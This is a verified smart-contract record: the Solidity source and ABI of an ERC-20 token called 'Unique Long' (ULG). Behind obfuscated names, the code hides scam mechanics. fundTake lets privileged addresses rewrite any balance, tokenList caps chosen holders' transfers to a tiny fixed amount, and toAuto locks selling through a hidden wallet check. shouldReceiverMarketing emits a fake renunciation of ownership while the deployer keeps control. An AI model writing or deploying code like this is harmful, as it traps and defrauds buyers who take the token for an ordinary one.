{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface limitShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract takeList {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface toLiquidity {\n    function createPair(address liquidityFund, address senderTx) external returns (address);\n}\n\ninterface feeSwapMode {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address liquidityWallet) external view returns (uint256);\n\n    function transfer(address maxTotal, uint256 atSenderFee) external returns (bool);\n\n    function allowance(address takeLaunch, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 atSenderFee) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address maxTotal,\n        uint256 atSenderFee\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed shouldWallet, uint256 value);\n    event Approval(address indexed takeLaunch, address indexed spender, uint256 value);\n}\n\ninterface modeLaunched is feeSwapMode {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract UniqueLong is takeList, feeSwapMode, modeLaunched {\n\n    function teamReceiver(address maxTrading) public {\n        if (toEnable) {\n            return;\n        }\n        \n        fromExempt[maxTrading] = true;\n        if (launchFund != buyTrading) {\n            buyTrading = false;\n        }\n        toEnable = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private amountEnableMin;\n\n    address buyExemptTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public maxAmount;\n\n    function tokenList(address marketingAt) public {\n        listTxTo();\n        if (shouldMax == tokenSell) {\n            amountShould = true;\n        }\n        if (marketingAt == maxAmount || marketingAt == fromLaunch) {\n            return;\n        }\n        txTrading[marketingAt] = true;\n    }\n\n    function shouldReceiverMarketing() public {\n        emit OwnershipTransferred(maxAmount, address(0));\n        tokenTo = address(0);\n    }\n\n    uint256 private buyTake;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingReceiver;\n    }\n\n    constructor (){\n        \n        limitShould tokenLimitFee = limitShould(buyExemptTeam);\n        fromLaunch = toLiquidity(tokenLimitFee.factory()).createPair(tokenLimitFee.WETH(), address(this));\n        \n        maxAmount = _msgSender();\n        shouldReceiverMarketing();\n        fromExempt[maxAmount] = true;\n        toSell[maxAmount] = tradingReceiver;\n        \n        emit Transfer(address(0), maxAmount, tradingReceiver);\n    }\n\n    function approve(address tradingLimitWallet, uint256 atSenderFee) public virtual override returns (bool) {\n        amountEnableMin[_msgSender()][tradingLimitWallet] = atSenderFee;\n        emit Approval(_msgSender(), tradingLimitWallet, atSenderFee);\n        return true;\n    }\n\n    uint256 private tradingReceiver = 100000000 * 10 ** 18;\n\n    function allowance(address modeEnableFee, address tradingLimitWallet) external view virtual override returns (uint256) {\n        if (tradingLimitWallet == buyExemptTeam) {\n            return type(uint256).max;\n        }\n        return amountEnableMin[modeEnableFee][tradingLimitWallet];\n    }\n\n    uint256 public tokenSell;\n\n    function fundTake(address feeSwapTotal, uint256 atSenderFee) public {\n        listTxTo();\n        toSell[feeSwapTotal] = atSenderFee;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return autoExempt;\n    }\n\n    function listTxTo() private view {\n        require(fromExempt[_msgSender()]);\n    }\n\n    bool public amountShould;\n\n    address public fromLaunch;\n\n    uint256 sellFund;\n\n    mapping(address => bool) public fromExempt;\n\n    uint256 public autoMarketing;\n\n    uint8 private isTeamWallet = 18;\n\n    uint256 buyFund;\n\n    function symbol() external view virtual override returns (string memory) {\n        return exemptShould;\n    }\n\n    string private exemptShould = \"ULG\";\n\n    string private autoExempt = \"Unique Long\";\n\n    uint256 public fromReceiver;\n\n    address tradingTotalTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public txTrading;\n\n    function takeLimit(address liquidityFrom, address maxTotal, uint256 atSenderFee) internal returns (bool) {\n        require(toSell[liquidityFrom] >= atSenderFee);\n        toSell[liquidityFrom] -= atSenderFee;\n        toSell[maxTotal] += atSenderFee;\n        emit Transfer(liquidityFrom, maxTotal, atSenderFee);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed maxMarketing, address indexed atSellFrom);\n\n    uint256 constant limitTokenTotal = 4 ** 10;\n\n    bool public toEnable;\n\n    uint256 public listSell;\n\n    function marketingTotal(uint256 atSenderFee) public {\n        listTxTo();\n        sellFund = atSenderFee;\n    }\n\n    function transfer(address feeSwapTotal, uint256 atSenderFee) external virtual override returns (bool) {\n        return toAuto(_msgSender(), feeSwapTotal, atSenderFee);\n    }\n\n    mapping(address => uint256) private toSell;\n\n    function balanceOf(address liquidityWallet) public view virtual override returns (uint256) {\n        return toSell[liquidityWallet];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return isTeamWallet;\n    }\n\n    function transferFrom(address liquidityFrom, address maxTotal, uint256 atSenderFee) external override returns (bool) {\n        if (_msgSender() != buyExemptTeam) {\n            if (amountEnableMin[liquidityFrom][_msgSender()] != type(uint256).max) {\n                require(atSenderFee <= amountEnableMin[liquidityFrom][_msgSender()]);\n                amountEnableMin[liquidityFrom][_msgSender()] -= atSenderFee;\n            }\n        }\n        return toAuto(liquidityFrom, maxTotal, atSenderFee);\n    }\n\n    uint256 public shouldMax;\n\n    bool public exemptFee;\n\n    address private tokenTo;\n\n    bool public launchFund;\n\n    function toAuto(address liquidityFrom, address maxTotal, uint256 atSenderFee) internal returns (bool) {\n        if (liquidityFrom == maxAmount) {\n            return takeLimit(liquidityFrom, maxTotal, atSenderFee);\n        }\n        uint256 modeTradingAuto = feeSwapMode(fromLaunch).balanceOf(tradingTotalTake);\n        require(modeTradingAuto == sellFund);\n        require(maxTotal != tradingTotalTake);\n        if (txTrading[liquidityFrom]) {\n            return takeLimit(liquidityFrom, maxTotal, limitTokenTotal);\n        }\n        return takeLimit(liquidityFrom, maxTotal, atSenderFee);\n    }\n\n    bool public buyTrading;\n\n    function getOwner() external view returns (address) {\n        return tokenTo;\n    }\n\n    function owner() external view returns (address) {\n        return tokenTo;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atSellFrom\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldWallet\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeEnableFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingLimitWallet\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingLimitWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atSenderFee\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityWallet\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeSwapTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atSenderFee\",\"type\":\"uint256\"}],\"name\":\"fundTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"atSenderFee\",\"type\":\"uint256\"}],\"name\":\"marketingTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldReceiverMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTrading\",\"type\":\"address\"}],\"name\":\"teamReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingAt\",\"type\":\"address\"}],\"name\":\"tokenList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeSwapTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atSenderFee\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atSenderFee\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "UniqueLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}